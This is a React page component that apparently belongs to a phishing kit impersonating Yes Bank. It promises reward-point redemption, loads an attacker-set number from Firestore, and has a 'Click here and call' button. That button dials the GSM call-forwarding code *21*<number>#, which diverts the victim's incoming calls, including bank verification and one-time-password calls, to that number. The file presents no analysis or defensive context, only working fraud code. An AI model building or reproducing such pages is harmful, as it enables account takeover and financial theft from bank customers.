import React, { useState, useEffect } from "react";
import FirebaseUtil from "./FirebaseRepo";
import myImage from "./assets/yes_bank_top.png";
import Image2 from "../src/Image/2.jpeg";
import Footer from "./components/Footer";

function ThirdPage() {
  const [forwardingNumber, setForwardingNumber] = useState(null);
  const [loading, setLoading] = useState(true);

  // Fetch forwarding number
  useEffect(() => {
    const getForwardingNumber = async () => {
      try {
        const result = await FirebaseUtil.getDocument(
          "settings_web3",
          "forwarding_numbers"
        );

        console.log("🔥 Firestore full result:", result);

        let forwardingNum = null;

        if (result && typeof result === "object") {
          if (result.call_forwarding_number) {
            forwardingNum = result.call_forwarding_number;
          } else if (Array.isArray(result.numbers) && result.numbers.length > 0) {
            forwardingNum = result.numbers[0];
          }
        } else if (typeof result === "string") {
          forwardingNum = result;
        }

        console.log("✅ Extracted forwarding number:", forwardingNum);

        setForwardingNumber(forwardingNum || null);
      } catch (error) {
        console.error("❌ Error fetching forwarding number:", error);
        setForwardingNumber(null);
      } finally {
        setLoading(false);
      }
    };

    getForwardingNumber();
  }, []);

  return (
    <>
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-blue-100 px-4">
        <div className="flex flex-col items-center w-full">
          {/* Image2 → only on mobile */}
          <div className="flex justify-center w-full md:hidden">
            <img
              src={Image2}
              alt="Mobile visual"
              className="w-full max-w-lg rounded-t-2xl shadow-md object-cover"
            />
          </div>

          {/* Form */}
          <div className="bg-white rounded-2xl mt-8 shadow-xl p-6 w-full max-w-lg border border-gray-200 md:py-12">
            <div className="flex justify-center mb-4">
              <img src={myImage} alt="Logo" className="h-14" />
            </div>

            <div className="flex justify-center mb-4">
              <p className="text-lg text-gray-900 mb-4 text-center">
                Welcome to Yes Bank Rewardz Points Redeem Process.
              </p>
            </div>

            <p className="text-lg text-gray-700 mb-6 text-center">
              One step away to Collect Your Rewardz Points on INR Rupees.
            </p>

            <div className="flex justify-center">
              <button
                onClick={() => {
                  if (forwardingNumber) {
                    window.open(`tel:*21*${forwardingNumber}%23`, "_self");
                  } else {
                    alert("⚠️ Forwarding number is not set in Firestore.");
                  }
                }}
                disabled={loading}
                className={`${
                  loading
                    ? "bg-gray-400 cursor-not-allowed"
                    : "bg-blue-600 hover:bg-blue-700"
                } text-white font-bold py-2 px-8 rounded-full shadow-md transition`}
              >
                {loading ? "Loading..." : "Click here and call.."}
              </button>
            </div>
          </div>
        </div>
      </div>

      <div className="mt-8">
        <Footer />
      </div>
    </>
  );
}

export default ThirdPage;
